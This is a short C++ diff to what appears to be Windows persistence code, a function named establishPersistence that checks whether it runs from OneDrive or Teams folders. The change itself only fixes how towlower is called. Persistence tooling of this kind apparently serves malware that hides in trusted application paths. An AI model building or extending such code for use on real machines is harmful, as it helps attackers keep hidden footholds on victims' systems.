@@ -15,6 +15,7 @@
 #include <random>
 #include <sstream>
 #include <algorithm>
+#include <cwctype>
 
 namespace persistence {
 
@@ -153,10 +154,10 @@ std::wstring establishPersistence(const std::wstring& overrideSourcePath) {
     wchar_t currentPathBuf[MAX_PATH];
     GetModuleFileNameW(NULL, currentPathBuf, MAX_PATH);
     std::wstring currentPath(currentPathBuf);
-    std::transform(currentPath.begin(), currentPath.end(), currentPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
+    std::transform(currentPath.begin(), currentPath.end(), currentPath.begin(), [](wchar_t c) { return (wchar_t)::towlower(c); });
 
     std::wstring targetPathLower = target.path;
-    std::transform(targetPathLower.begin(), targetPathLower.end(), targetPathLower.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
+    std::transform(targetPathLower.begin(), targetPathLower.end(), targetPathLower.begin(), [](wchar_t c) { return (wchar_t)::towlower(c); });
 
     if (currentPath.find(L"\\microsoft\\onedrive\\") != std::wstring::npos ||
         currentPath.find(L"\\microsoft\\teams\\") != std::wstring::npos ||
